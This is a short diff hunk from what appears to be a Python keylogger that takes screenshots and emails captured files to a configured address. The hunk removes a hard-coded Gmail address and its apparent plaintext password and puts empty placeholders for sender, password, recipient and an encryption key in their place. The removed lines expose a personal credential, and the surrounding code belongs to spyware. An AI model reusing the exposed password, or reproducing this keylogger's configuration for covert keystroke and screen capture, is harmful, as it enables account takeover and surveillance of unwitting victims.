@@ -28,9 +28,9 @@ from requests import get
 from multiprocessing import  Process,freeze_support
 from PIL import ImageGrab
 
-email_address="keiterjoel2@gmail.com"
-password="GodisGreat77."
-email_to="keiterjoel2@gmail.com"
+email_address=""#Insert email address that sends files
+password=""#Insert email password
+email_to=""#Insert email address that receives files
 key=""#Insert key from key gen here
 
 # Create Key log file
